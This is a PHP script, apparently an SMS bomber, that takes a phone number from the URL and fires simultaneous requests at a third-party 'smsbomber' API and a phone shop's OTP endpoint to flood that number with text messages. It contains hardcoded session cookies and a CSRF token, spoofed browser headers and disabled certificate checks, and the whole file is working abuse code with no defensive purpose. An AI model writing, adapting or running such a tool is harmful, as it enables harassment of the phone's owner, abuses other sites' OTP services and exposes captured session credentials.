<?php
session_start();
if (isset($_GET['number']) && !empty($_GET['number'])) {
    $number = trim($_GET['number']);
    if (!isset($_SESSION['curr_count'])) {
        $_SESSION['curr_count'] = 0;
    }
    $_SESSION['curr_count']++;
    $curr_count = $_SESSION['curr_count'];
    $phpSessId = "6n1d28ih5dgvrno7s760ha4p1g";
    $csrfToken = "1.-YjQ-hOkQxxk57Qow01GEAwuSlM9qYzFKA573WdL8mTYEqgdTJddBr23P8AynDz9SgVWL1LB_Encb6WANDw6nIxjAZd3jklntvjfa6tFK_LB39HnrafNma9U-zK4gxwWVxXsv-qrq3qSiIsVDhQtDAjxy3j-m0vEHVET3RH0c1py0qxfDahdbOgf6gND9LzYXz4g8Xp6cug-8xJvOfxaVTZKZgr7O5P3M-qm_CaTltzX-8o23XiLPvCxwUuRyopNSjIVgIYWxvgVumJy7ZBk7UhQcGpXsbErEajAN4bpsajvsXUfnj_d_XbkQT7vCbeYtTqRqszP5i15OtZ2BYdr7EtNwK-RGxmpCQcaAhQCT3bYdOr7xNRCLbMgK90gLM5ac3cdRvo6B1NHTx0MVtC79LyJm56gQDsN2tgup2LnVH3ovOScpWJFubZCdIRYObMBMbY0cdj5yOhm1xeY5AIdsy8jNLOi6jUpaSRkrrPiwkdy-PHR7kCxIGznZ4EI69GZ59b97e4_FDz5dT9NHNMe57nBU10WJxF4T7dDraHCCjQ.xFfKRUi5MTvzQHSDsGdYcw.dedf233f0fb62f4a38eb1990dedd6323db1b0c3f1f1b50c9921d8fadb8f9f278";
    $jsonPayload1 = json_encode([
        "mobile" => $number,
        "count" => 150,
        "country_code" => "91",
        "curr_count" => $curr_count,
        "token" => $csrfToken,
        "request_type" => "sms_bomber"
    ]);

    $ch1 = curl_init("https://greatonlinetools.com/smsbomber/endpoints/api/receive_number.php");
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, $jsonPayload1);
    curl_setopt($ch1, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "X-Requested-With: XMLHttpRequest",
        "Origin: https://greatonlinetools.com",
        "Referer: https://greatonlinetools.com/smsbomber/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
        "Accept: */*",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br, zstd",
        "Connection: keep-alive",
        "Sec-Fetch-Dest: empty",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Site: same-origin",
        "Priority: u=0"
    ]);
    curl_setopt($ch1, CURLOPT_COOKIE, "PHPSESSID=" . $phpSessId . "; _ga=GA1.2.1114936498.1783321546; _gid=GA1.2.1816116849.1783321546; _ga_DKN9J9SHT6=GS2.1.s1783321546$o1$g1$t1783321620$j51$l0$h0; __gads=ID=583e45a2d2ddad74:T=1783321548:RT=1783321548:S=ALNI_Mb7pF0RxsvwZK3wdm1w2ZPshuylug; __gpi=UID=00001415cbc43c61:T=1783321548:RT=1783321548:S=ALNI_MYRzyG61s-fxR312dnGTXGy5FeRTg; __eoi=ID=dde3e85afe64c3ef:T=1783321548:RT=1783321548:S=AA-AfjawDzIU-GlUfOrQKDuAykMl; __gsas=ID=ed833ad0bbd8b0dc:T=1783321553:RT=1783321553:S=ALNI_MbEg5T7PdDlUFdKgq3Roldu-0nAdg");
    curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch1, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch1, CURLOPT_ENCODING, 'gzip, deflate, br, zstd');

    $postData2 = http_build_query([
        'mobilenumber' => $number,
        'email' => 'test@example.com'
    ]);

    $ch2 = curl_init("https://www.phonebazaar.info/send-otp.php");
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $postData2);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, [
        "Content-Type: application/x-www-form-urlencoded"
    ]);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch2, CURLOPT_TIMEOUT, 30);

    $mh = curl_multi_init();
    curl_multi_add_handle($mh, $ch1);
    curl_multi_add_handle($mh, $ch2);

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        usleep(10000);
    } while ($running > 0);

    $response1 = curl_multi_getcontent($ch1);
    $response2 = curl_multi_getcontent($ch2);

    curl_multi_remove_handle($mh, $ch1);
    curl_multi_remove_handle($mh, $ch2);
    curl_multi_close($mh);
    
    curl_close($ch1);
    curl_close($ch2);

    header('Content-Type: application/json');
    echo json_encode([
        "success" => true,
        "data" => [
            "phone" => $number,
            "curr_count" => $curr_count,
            "total_sent" => $curr_count,
            "greatonlinetools" => json_decode($response1, true) ?: $response1,
            "phonebazaar" => json_decode($response2, true) ?: $response2
        ]
    ]);

} else {
    header('Content-Type: application/json');
    echo json_encode([
        "success" => false,
        "error" => "Phone number is required",
        "usage" => "?number=98xxxxxxxx"
    ]);
}
?>
